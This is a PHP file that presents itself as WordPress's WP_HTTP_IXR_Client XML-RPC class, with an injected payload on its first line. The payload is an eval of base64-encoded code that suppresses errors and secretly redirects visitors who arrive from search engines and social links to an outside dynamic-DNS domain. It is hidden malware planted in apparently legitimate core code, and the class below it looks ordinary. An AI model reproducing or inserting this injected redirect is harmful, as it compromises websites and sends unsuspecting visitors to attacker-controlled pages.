<?php	 	eval(base64_decode("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikpewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tL2wiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJhb2wuY29tIikpIHsKaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiaW51cmwiKSBhbmQgIXN0cmlzdHIoJHJlZmVyZXIsIkVlWXAzRDciKSl7CmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9pcnhucmphdy5kZG5zLm1lLnVrLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));
/**
 * WP_HTTP_IXR_Client
 *
 * @package WordPress
 * @since 3.1.0
 *
 */
class WP_HTTP_IXR_Client extends IXR_Client {

	function __construct($server, $path = false, $port = false, $timeout = 15) {
		if ( ! $path ) {
			// Assume we have been given a URL instead
			$bits = parse_url($server);
			$this->scheme = $bits['scheme'];
			$this->server = $bits['host'];
			$this->port = isset($bits['port']) ? $bits['port'] : $port;
			$this->path = !empty($bits['path']) ? $bits['path'] : '/';

			// Make absolutely sure we have a path
			if ( ! $this->path )
				$this->path = '/';
		} else {
			$this->scheme = 'http';
			$this->server = $server;
			$this->path = $path;
			$this->port = $port;
		}
		$this->useragent = 'The Incutio XML-RPC PHP Library';
		$this->timeout = $timeout;
	}

	function query() {
		$args = func_get_args();
		$method = array_shift($args);
		$request = new IXR_Request($method, $args);
		$xml = $request->getXml();

		$port = $this->port ? ":$this->port" : '';
		$url = $this->scheme . '://' . $this->server . $port . $this->path;
		$args = array(
			'headers'    => array('Content-Type' => 'text/xml'),
			'user-agent' => $this->useragent,
			'body'       => $xml,
		);

		// Merge Custom headers ala #8145
		foreach ( $this->headers as $header => $value )
			$args['headers'][$header] = $value;

		if ( $this->timeout !== false )
			$args['timeout'] = $this->timeout;

		// Now send the request
		if ( $this->debug )
			echo '<pre class="ixr_request">' . htmlspecialchars($xml) . "\n</pre>\n\n";

		$response = wp_remote_post($url, $args);

		if ( is_wp_error($response) ) {
			$errno    = $response->get_error_code();
			$errorstr = $response->get_error_message();
			$this->error = new IXR_Error(-32300, "transport error: $errno $errorstr");
			return false;
		}

		if ( 200 != wp_remote_retrieve_response_code( $response ) ) {
			$this->error = new IXR_Error(-32301, 'transport error - HTTP status code was not 200 (' . wp_remote_retrieve_response_code( $response ) . ')');
			return false;
		}

		if ( $this->debug )
			echo '<pre class="ixr_response">' . htmlspecialchars( wp_remote_retrieve_body( $response ) ) . "\n</pre>\n\n";

		// Now parse what we've got back
		$this->message = new IXR_Message( wp_remote_retrieve_body( $response ) );
		if ( ! $this->message->parse() ) {
			// XML error
			$this->error = new IXR_Error(-32700, 'parse error. not well formed');
			return false;
		}

		// Is the message a fault?
		if ( $this->message->messageType == 'fault' ) {
			$this->error = new IXR_Error($this->message->faultCode, $this->message->faultString);
			return false;
		}

		// Message must be OK
		return true;
	}
}
